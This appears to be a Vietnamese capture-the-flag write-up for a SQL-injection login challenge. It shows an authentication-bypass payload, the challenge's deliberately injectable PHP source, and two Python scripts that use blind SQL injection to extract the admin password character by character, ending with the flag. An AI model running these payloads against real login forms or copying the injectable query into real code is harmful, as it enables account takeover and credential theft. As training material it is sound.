## Bài 1
* Nhập đoạn mã `""' OR 1=1 --` vào ô username rồi login ta được trả về đoạn mã
``` html
Congratulations!
It's too easy?
Don't worry.
The flag is admin's password.

Hint:
<?php
    function h($s){return htmlspecialchars($s,ENT_QUOTES,'UTF-8');}
    
    $id = isset($_POST['id']) ? $_POST['id'] : '';
    $pass = isset($_POST['pass']) ? $_POST['pass'] : '';
    $login = false;
    $err = '';
    
    if ($id!=='')
    {
        $db = new PDO('sqlite:database.db');
        $r = $db->query("SELECT * FROM user WHERE id='$id' AND pass='$pass'");
        $login = $r && $r->fetch();
        if (!$login)
            $err = 'Login Failed';
    }
?><!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>q6q6q6q6q6q6q6q6q6q6q6q6q6q6q6q6</title>
  </head>
  <body>
    <?php if (!$login) { ?>
    <p>
      First, login as "admin".
    </p>
    <div style="font-weight:bold; color:red">
      <?php echo h($err); ?>
    </div>
    <form method="POST">
      <div>ID: <input type="text" name="id" value="<?php echo h($id); ?>"></div>
      <div>Pass: <input type="text" name="pass" value="<?php echo h($pass); ?>"></div>
      <div><input type="submit"></div>
    </form>
    <?php } else { ?>
    <p>
      Congratulations!<br>
      It's too easy?<br>
      Don't worry.<br>
      The flag is admin's password.<br>
      <br>
      Hint:<br>
    </p>
    <pre><?php echo h(file_get_contents('index.php')); ?></pre>
    <?php } ?>
  </body>
</html>
```
* Ta đã đăng nhập được nhưng trang báo về là flag là mật khẩu của tài khoản admin
* Sử dụng 1 chương trình Python để tìm độ dài của mật khẩu
```python
import urllib
import urllib2

url = "http://ctfq.sweetduet.info:10080/~q6/"

def main():
    for i in range(1, 100):
        data = {
            "id": "admin' AND (SELECT LENGTH(pass) FROM user WHERE id = 'admin') = {counter} --".format(counter=i),
            "pass": "",
        }
        print (data)
        data1 = urllib.urlencode(data).encode("utf-8")
        req = urllib2.Request(url, data1)
        res = urllib2.urlopen(req)
        print (res)
        if int(res.headers["content-length"]) > 2000:
            print("Do dai cua password: {counter}".format(counter=i))
            break
if __name__ == "__main__":
    main()
```
* Ta được độ dài của mật khẩu là 21
* Tiếp tục ta sử dụng 1 chương trình python nữa để lấy mật khẩu. Biết được độ dài mật khẩu là 21 rồi in ra từng ký tự trong mật khẩu, sử dụng các chữ cái và chữ số từ 48-125 trong bảng mã `Ascii`
```python
import urllib
import urllib2

url = "http://ctfq.sweetduet.info:10080/~q6/"

string =''
for i in range(1, 22):
    for char_n in range(48, 125):
        flag = chr(char_n)
        data = {
            "id": "admin' AND SUBSTR((SELECT pass FROM user WHERE id = 'admin'), {index}, 1) = '{char}' --".format(index=i, char=flag),"pass": "",
        }
        data1 = urllib.urlencode(data).encode("utf-8")
        #print data1
        req = urllib2.Request(url, data1)
        res = urllib2.urlopen(req)
        #print (res)
        if int(res.headers["content-length"]) > 2000:
            print flag
            string += flag
            break
print string
```
* Ta thu được cờ `FLAG_KpWa4ji3uZk6TrPK`